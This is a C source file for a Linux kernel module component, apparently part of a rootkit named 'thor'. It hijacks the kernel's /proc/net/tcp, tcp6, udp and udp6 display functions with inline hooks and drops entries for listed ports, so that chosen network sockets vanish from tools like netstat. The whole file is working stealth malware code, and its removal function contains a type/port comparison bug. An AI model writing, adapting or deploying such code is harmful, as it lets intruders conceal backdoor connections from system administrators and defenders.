#include "sockethider.h"

#include <linux/slab.h>
#include <linux/version.h>
#include <net/tcp.h>
#include <net/udp.h>

#include "helper.h"
#include "hijack.h"

/* socket list node */
struct _socket_list {
    int port;
    enum socket_type type;
    struct list_head list;
};

/* hiding lists */
static struct _socket_list socket_list;

/* original functions which we need to hijack */
static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);

/* defines */
#define TMPSZ_TCP4 150
#define TMPSZ_TCP6 176
#define TMPSZ_UDP4 128
#define TMPSZ_UDP6 168

/* function prototypes */
static void *get_tcp_seq_show(const char *path);
static void *get_udp_seq_show(const char *path);
static int thor_tcp4_seq_show(struct seq_file *seq, void *v);
static int thor_tcp6_seq_show(struct seq_file *seq, void *v);
static int thor_udp4_seq_show(struct seq_file *seq, void *v);
static int thor_udp6_seq_show(struct seq_file *seq, void *v);

int sockethider_init(void)
{
    INIT_LIST_HEAD(&socket_list.list);

    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    if (tcp4_seq_show == NULL)
        return -1;

    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
    if (tcp6_seq_show == NULL)
        return -1;

    udp4_seq_show = get_udp_seq_show("/proc/net/udp");
    if (udp4_seq_show == NULL)
        return -1;

    udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
    if (udp6_seq_show == NULL)
        return -1;

    hijack(tcp4_seq_show, thor_tcp4_seq_show);
    hijack(tcp6_seq_show, thor_tcp6_seq_show);
    hijack(udp4_seq_show, thor_udp4_seq_show);
    hijack(udp6_seq_show, thor_udp6_seq_show);

    return 0;
}

void sockethider_cleanup(void)
{
    if (tcp4_seq_show != NULL)
        unhijack(tcp4_seq_show);

    if (tcp6_seq_show != NULL)
        unhijack(tcp6_seq_show);

    if (udp4_seq_show != NULL)
        unhijack(udp4_seq_show);

    if (udp6_seq_show != NULL)
        unhijack(udp6_seq_show);

    clear_socket_list();
}

/* function to get a pointer to the tcp{4,6}_seq_show function */
static void *get_tcp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filep->f_dentry->d_inode)->data;
#else
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
#endif
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

/* function to get a pointer to the udp{4,6}_seq_show function */
static void *get_udp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct udp_seq_afinfo *afinfo;

    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filep->f_dentry->d_inode)->data;
#else
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
#endif
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct _socket_list *tmp;

    /*
     * TODO: this leaves the tcp4_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of tcp4_seq_show_firstinstr
     * and jump to the second instruction of the original tcp4_seq_show
     */
    unhijack(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hijack(tcp4_seq_show, thor_tcp4_seq_show);

    /* hide port */
    list_for_each_entry(tmp, &(socket_list.list), list) {
        if (tmp->type == tcp4) {
            sprintf(port, ":%04X", tmp->port);

            if (strnstr(seq->buf + seq->count - TMPSZ_TCP4, port, TMPSZ_TCP4)) {
                seq->count -= TMPSZ_TCP4;
                break;
            }
        }
    }

    return ret;
}

static int thor_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct _socket_list *tmp;

    /*
     * TODO: this leaves the tcp6_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of tcp6_seq_show_firstinstr
     * and jump to the second instruction of the original tcp6_seq_show
     */
    unhijack(tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    hijack(tcp6_seq_show, thor_tcp6_seq_show);

    /* hide port */
    list_for_each_entry(tmp, &(socket_list.list), list) {
        if (tmp->type == tcp6) {
            sprintf(port, ":%04X", tmp->port);

            if (strnstr(seq->buf + seq->count - TMPSZ_TCP6, port, TMPSZ_TCP6)) {
                seq->count -= TMPSZ_TCP6;
                break;
            }
        }
    }

    return ret;
}

static int thor_udp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct _socket_list *tmp;

    /*
     * TODO: this leaves the udp4_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of udp4_seq_show_firstinstr
     * and jump to the second instruction of the original udp4_seq_show
     */
    unhijack(udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    hijack(udp4_seq_show, thor_udp4_seq_show);

    /* hide port */
    list_for_each_entry(tmp, &(socket_list.list), list) {
        if (tmp->type == udp4) {
            sprintf(port, ":%04X", tmp->port);

            if (strnstr(seq->buf + seq->count - TMPSZ_UDP4, port, TMPSZ_UDP4)) {
                seq->count -= TMPSZ_UDP4;
                break;
            }
        }
    }

    return ret;
}

static int thor_udp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct _socket_list *tmp;

    /*
     * TODO: this leaves the udp6_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of udp6_seq_show_firstinstr
     * and jump to the second instruction of the original udp6_seq_show
     * */
    unhijack(udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    hijack(udp6_seq_show, thor_udp6_seq_show);

    /* hide port */
    list_for_each_entry(tmp, &(socket_list.list), list) {
        if (tmp->type == udp6) {
            sprintf(port, ":%04X", tmp->port);

            if (strnstr(seq->buf + seq->count - TMPSZ_UDP6, port, TMPSZ_UDP6)) {
                seq->count -= TMPSZ_UDP6;
                break;
            }
        }
    }

    return ret;
}

void add_to_socket_list(int port, enum socket_type type)
{
    struct _socket_list *tmp;

    tmp = (struct _socket_list*) kmalloc(sizeof(struct _socket_list), GFP_KERNEL);
    tmp->port = port;
    tmp->type = type;

    list_add(&(tmp->list), &(socket_list.list));
}

void remove_from_socket_list(int port, enum socket_type type)
{
    struct _socket_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(socket_list.list)) {
        tmp = list_entry(pos, struct _socket_list, list);
        if (port == tmp->port && type == tmp->port) {
            list_del(pos);
            kfree(tmp);
        }
    }
}

void clear_socket_list(void)
{
    struct _socket_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(socket_list.list)) {
        tmp = list_entry(pos, struct _socket_list, list);
        list_del(pos);
        kfree(tmp);
    }
}
